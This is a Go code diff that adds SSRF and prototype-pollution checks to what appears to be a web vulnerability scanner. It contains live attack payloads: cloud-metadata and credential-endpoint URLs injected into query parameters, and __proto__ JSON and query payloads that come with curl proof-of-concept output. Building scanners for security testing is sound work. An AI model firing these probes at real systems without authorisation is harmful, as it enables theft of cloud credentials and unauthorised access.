@@ -152,6 +152,26 @@ func RunNovelAttacks(target string, liveURLs []string, onResult func(NovelAttack
 		}
 	}()
 
+	// 11. SSRF Detection
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		result := detectSSRF(target, liveURLs)
+		if result.Vulnerable {
+			onResult(result)
+		}
+	}()
+
+	// 12. Prototype Pollution (Node.js)
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		result := detectPrototypePollution(target, liveURLs)
+		if result.Vulnerable {
+			onResult(result)
+		}
+	}()
+
 	wg.Wait()
 }
 
@@ -639,4 +659,192 @@ func isAuthEndpoint(url string) bool {
 		}
 	}
 	return false
+}
+
+// detectSSRF tests for Server-Side Request Forgery via URL parameters.
+func detectSSRF(target string, liveURLs []string) NovelAttackResult {
+	result := NovelAttackResult{
+		AttackType:  "Server-Side Request Forgery (SSRF)",
+		URL:         target,
+		Severity:    "critical",
+		Description: "SSRF allows the server to make requests to internal services",
+	}
+
+	client := &http.Client{
+		Timeout: 8 * time.Second,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+	}
+
+	// SSRF payloads targeting cloud metadata
+	ssrfPayloads := []string{
+		"http://169.254.169.254/latest/meta-data/",
+		"http://metadata.google.internal/computeMetadata/v1/",
+		"http://169.254.170.2/v2/credentials/",
+		"http://localhost/",
+		"http://127.0.0.1/",
+	}
+
+	// Find URL parameters that might accept URLs
+	urlParams := []string{"url", "redirect", "next", "callback", "return", "dest", "destination",
+		"target", "link", "src", "source", "fetch", "load", "path", "file", "image", "img"}
+
+	for _, liveURL := range liveURLs {
+		if !strings.Contains(liveURL, "?") {
+			continue
+		}
+		parts := strings.SplitN(liveURL, "?", 2)
+		params := strings.Split(parts[1], "&")
+		for _, param := range params {
+			kv := strings.SplitN(param, "=", 2)
+			if len(kv) != 2 {
+				continue
+			}
+			paramName := strings.ToLower(kv[0])
+			for _, urlParam := range urlParams {
+				if paramName == urlParam || strings.Contains(paramName, urlParam) {
+					// Test SSRF
+					for _, payload := range ssrfPayloads[:2] { // test first 2 only
+						testURL := parts[0] + "?" + kv[0] + "=" + payload
+						req, err := http.NewRequest("GET", testURL, nil)
+						if err != nil {
+							continue
+						}
+						resp, err := client.Do(req)
+						if err != nil {
+							continue
+						}
+						body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
+						resp.Body.Close()
+
+						bodyStr := string(body)
+						// Check for AWS metadata response
+						if strings.Contains(bodyStr, "ami-id") || strings.Contains(bodyStr, "instance-id") ||
+							strings.Contains(bodyStr, "iam") || strings.Contains(bodyStr, "security-credentials") {
+							result.Vulnerable = true
+							result.URL = testURL
+							result.Evidence = fmt.Sprintf("AWS metadata accessible via SSRF at param '%s'", kv[0])
+							result.PoC = fmt.Sprintf("GET %s\n# Returns AWS metadata", testURL)
+							return result
+						}
+						// Check for internal service response
+						if resp.StatusCode == 200 && (strings.Contains(bodyStr, "localhost") ||
+							strings.Contains(bodyStr, "127.0.0.1") || len(bodyStr) > 100) {
+							result.Vulnerable = true
+							result.URL = testURL
+							result.Evidence = fmt.Sprintf("Internal request succeeded via param '%s' (status 200, %d bytes)", kv[0], len(bodyStr))
+							result.PoC = fmt.Sprintf("GET %s\n# Returns internal content", testURL)
+							return result
+						}
+					}
+				}
+			}
+		}
+	}
+
+	// Also test the main target with SSRF payloads in common params
+	for _, payload := range ssrfPayloads[:1] {
+		for _, param := range urlParams[:5] {
+			testURL := strings.TrimRight(target, "/") + "?" + param + "=" + payload
+			req, err := http.NewRequest("GET", testURL, nil)
+			if err != nil {
+				continue
+			}
+			resp, err := client.Do(req)
+			if err != nil {
+				continue
+			}
+			body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
+			resp.Body.Close()
+
+			if strings.Contains(string(body), "ami-id") || strings.Contains(string(body), "instance-id") {
+				result.Vulnerable = true
+				result.URL = testURL
+				result.Evidence = fmt.Sprintf("AWS metadata accessible via SSRF at param '%s'", param)
+				result.PoC = fmt.Sprintf("GET %s", testURL)
+				return result
+			}
+		}
+	}
+
+	return result
+}
+
+// detectPrototypePollution tests for JavaScript prototype pollution.
+func detectPrototypePollution(target string, liveURLs []string) NovelAttackResult {
+	result := NovelAttackResult{
+		AttackType:  "Prototype Pollution",
+		URL:         target,
+		Severity:    "high",
+		Description: "Prototype pollution allows modifying JavaScript object prototypes",
+	}
+
+	client := &http.Client{Timeout: 8 * time.Second}
+
+	// Test prototype pollution via query parameters
+	pollutionPayloads := []string{
+		"?__proto__[admin]=true",
+		"?__proto__.admin=true",
+		"?constructor.prototype.admin=true",
+	}
+
+	for _, liveURL := range append(liveURLs, target) {
+		baseURL := strings.Split(liveURL, "?")[0]
+		for _, payload := range pollutionPayloads {
+			testURL := baseURL + payload
+			req, err := http.NewRequest("GET", testURL, nil)
+			if err != nil {
+				continue
+			}
+			resp, err := client.Do(req)
+			if err != nil {
+				continue
+			}
+			body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
+			resp.Body.Close()
+
+			bodyStr := string(body)
+			// Check if admin=true is reflected or if behavior changes
+			if strings.Contains(bodyStr, `"admin":true`) ||
+				strings.Contains(bodyStr, `"isAdmin":true`) ||
+				strings.Contains(bodyStr, `"role":"admin"`) {
+				result.Vulnerable = true
+				result.URL = testURL
+				result.Evidence = fmt.Sprintf("Prototype pollution payload reflected in response: admin=true")
+				result.PoC = fmt.Sprintf("GET %s\n# admin property set to true via prototype pollution", testURL)
+				return result
+			}
+		}
+
+		// Test via POST body (JSON)
+		jsonPayloads := []string{
+			`{"__proto__":{"admin":true}}`,
+			`{"constructor":{"prototype":{"admin":true}}}`,
+		}
+		for _, jsonPayload := range jsonPayloads {
+			req, err := http.NewRequest("POST", baseURL, strings.NewReader(jsonPayload))
+			if err != nil {
+				continue
+			}
+			req.Header.Set("Content-Type", "application/json")
+			resp, err := client.Do(req)
+			if err != nil {
+				continue
+			}
+			body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
+			resp.Body.Close()
+
+			bodyStr := string(body)
+			if strings.Contains(bodyStr, `"admin":true`) || strings.Contains(bodyStr, `"isAdmin":true`) {
+				result.Vulnerable = true
+				result.URL = baseURL
+				result.Evidence = "Prototype pollution via JSON body — admin property set"
+				result.PoC = fmt.Sprintf("curl -X POST %s -H 'Content-Type: application/json' -d '%s'", baseURL, jsonPayload)
+				return result
+			}
+		}
+	}
+
+	return result
 }
